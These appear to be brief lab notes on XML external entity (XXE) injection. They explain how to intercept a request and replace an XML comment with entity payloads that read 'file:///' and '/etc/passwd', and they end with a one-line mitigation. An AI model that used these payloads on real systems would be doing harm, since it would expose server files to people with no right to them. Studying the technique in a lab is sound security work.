intercept

change
<?xml version='1.0'?><comment> <text>hello!</text></comment>

to 
<?xml version='1.0'?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///" >]>
<comment>
<text>OMAR_WAS_HERE&xxe;</text>
</comment>


then forward and see the result on browser


<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<comment>
<text>GIVENMEPASSWDs!&xxe;</text>


<h2>mititgating injection</h2>
<p><b>santize user input</b></p>

